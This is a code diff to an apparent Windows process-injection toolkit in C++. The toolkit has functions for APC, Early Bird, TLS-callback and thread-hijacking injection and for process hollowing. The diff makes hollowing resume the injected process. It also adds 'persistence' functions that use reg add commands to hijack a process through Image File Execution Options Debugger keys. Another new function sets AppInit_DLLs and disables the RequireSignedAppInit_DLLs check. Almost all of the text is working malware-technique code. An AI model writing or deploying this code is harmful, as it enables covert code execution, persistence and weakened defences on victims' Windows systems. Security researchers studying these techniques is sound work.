@@ -26,6 +26,8 @@ DWORD InjectUsingEarlyBirdAPC(WCHAR* ExecutablePath, WCHAR* ShellCodeFileName);
 DWORD InjectUsingTLSCallBack(DWORD PID, WCHAR* ShellCodeFileName , WCHAR* ExecutablePath );
 DWORD InjectUsingThreadExecutionHijacking(DWORD PID, WCHAR* ShellCodeFileName);
 DWORD InjectUsingProcessHollowing(WCHAR* TargetExecutable, WCHAR* SourceExecutable);
+DWORD InjectUsingImageFileExecutionOptions(WCHAR* TargetProcess, WCHAR* SourceProcessToStart);
+DWORD InjectUsingAppInit_DLLs(WCHAR* DLLName);
 
 
 DWORD InjectDllUsingCreateRemoteThread(DWORD PID, WCHAR* DllName) {
@@ -203,7 +205,7 @@ DWORD InjectUsingAPC(DWORD PID, WCHAR* ShellCodeFileName) {
 DWORD InjectUsingEarlyBirdAPC(WCHAR* ExecutablePath, WCHAR* ShellCodeFileName) {
 
 	PROCESS_INFO ProcInfo;
-	DWORD Status = StartExecutableAsSuspended(ExecutablePath, &ProcInfo,CREATE_SUSPENDED);
+	DWORD Status = StartExecutable(ExecutablePath, &ProcInfo,CREATE_SUSPENDED);
 	if (!Status) {
 		return -1;
 	}
@@ -227,7 +229,7 @@ DWORD InjectUsingTLSCallBack(DWORD PID, WCHAR* ShellCodeFileName, WCHAR* Executa
 		ProcessInfo.PID =PID;
 	}
 	else {
-		Status = StartExecutableAsSuspended(ExecutablePath, &ProcessInfo, DEBUG_PROCESS);
+		Status = StartExecutable(ExecutablePath, &ProcessInfo, DEBUG_PROCESS);
 		if (!Status) {
 			return -1;
 		}
@@ -358,7 +360,7 @@ DWORD InjectUsingProcessHollowing(WCHAR* TargetExecutable, WCHAR* SourceExecutab
 	PROCESS_INFO ProcessInfo;
 	DWORD Status = FALSE;
 
-	Status = StartExecutableAsSuspended(TargetExecutable, &ProcessInfo, CREATE_SUSPENDED);
+	Status = StartExecutable(TargetExecutable, &ProcessInfo, CREATE_SUSPENDED);
 	if (!Status) {
 		return -1;
 	}
@@ -387,7 +389,6 @@ DWORD InjectUsingProcessHollowing(WCHAR* TargetExecutable, WCHAR* SourceExecutab
 		return -1;
 	}
 
-	printf("%p\n", pPEB->ImageBaseAddress);
 	PVOID pRemoteImage = VirtualAllocEx(hProcess, pPEB->ImageBaseAddress, pSourceHeaders->OptionalHeader.SizeOfImage,
 		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 	if (!pRemoteImage)
@@ -395,7 +396,6 @@ DWORD InjectUsingProcessHollowing(WCHAR* TargetExecutable, WCHAR* SourceExecutab
 		printf("VirtualAllocEx call failed 0x%x\r\n",GetLastError());
 		return -1;
 	}
-	printf("%p    %d\n", pRemoteImage, pSourceHeaders->OptionalHeader.SizeOfImage);
 
 
 	DWORD64 dwDelta = (DWORD64)pPEB->ImageBaseAddress - pSourceHeaders->OptionalHeader.ImageBase;
@@ -502,12 +502,76 @@ DWORD InjectUsingProcessHollowing(WCHAR* TargetExecutable, WCHAR* SourceExecutab
 		return -1;
 	}
 
-	printf("%p\n", dwEntrypoint);
-	/*if (!ResumeThread(ProcessInfo.MainThreadHandle))
+	if (!ResumeThread(ProcessInfo.MainThreadHandle))
 	{
 		printf("Error resuming thread Error Code 0x%x\r\n",GetLastError());
 		return -1;
-	}*/
+	}
 
+	return 0;
+}
+
+
+//Persestance
+DWORD InjectUsingImageFileExecutionOptions(WCHAR* TargetProcess, WCHAR* SourceProcessToStart) {
+
+	BOOL Status = 0;
+	wstring RegAddCommand = L"reg add ";
+	wstring KEY = L"\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\";
+	wstring wsTargetProcess = TargetProcess;
+	wstring wsSourceProcessToStart = SourceProcessToStart;
+	wstring CmdCommand = L"C:\\WINDOWS\\System32\\cmd.exe /c " + RegAddCommand + KEY + wsTargetProcess + L"\"" + L" /v GlobalFlag /t REG_DWORD /d 512";
+
+	PROCESS_INFO info;
+	Status = StartExecutable((WCHAR*)CmdCommand.c_str(), &info, NULL);
+	if (!Status) {
+		return -1;
+	}
+
+	CmdCommand = L"";
+	
+	CmdCommand = L"C:\\WINDOWS\\System32\\cmd.exe /c " + RegAddCommand + KEY + wsTargetProcess + L"\"" + L" /v Debugger /t REG_SZ /d " + wsSourceProcessToStart;
+	Status = StartExecutable((WCHAR*)CmdCommand.c_str(), &info, NULL);
+	if (!Status) {
+		return -1;
+	}
+
+	return 0;
+}
+
+//Does not work When Secure Boot is ON
+DWORD InjectUsingAppInit_DLLs(WCHAR* DLLName) {
+
+	BOOL Status = 0;
+	PROCESS_INFO info;
+
+	wstring RegAddCommand = L"reg add ";
+	wstring KEY = L"\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows";
+	wstring wsDLLName = DLLName;
+
+	wstring CmdCommand = L"C:\\WINDOWS\\System32\\cmd.exe /c " + RegAddCommand + KEY  + L"\"" + L" /v LoadAppInit_DLLs /t REG_DWORD /d 1 /f";
+
+	Status = StartExecutable((WCHAR*)CmdCommand.c_str(), &info, NULL);
+	if (!Status) {
+		return -1;
+	}
+
+	CmdCommand = L"";
+
+	CmdCommand = L"C:\\WINDOWS\\System32\\cmd.exe /c " + RegAddCommand + KEY  + L"\"" + L" /v AppInit_DLLs /t REG_SZ /d " + wsDLLName + L" /f";
+
+	Status = StartExecutable((WCHAR*)CmdCommand.c_str(), &info, NULL);
+	if (!Status) {
+		return -1;
+	}
+
+	CmdCommand = L"";
+
+	CmdCommand = L"C:\\WINDOWS\\System32\\cmd.exe /c " + RegAddCommand + KEY + L"\"" + L" /v RequireSignedAppInit_DLLs /t REG_DWORD /d 0 /f";
+
+	Status = StartExecutable((WCHAR*)CmdCommand.c_str(), &info, NULL);
+	if (!Status) {
+		return -1;
+	}
 	return 0;
 }
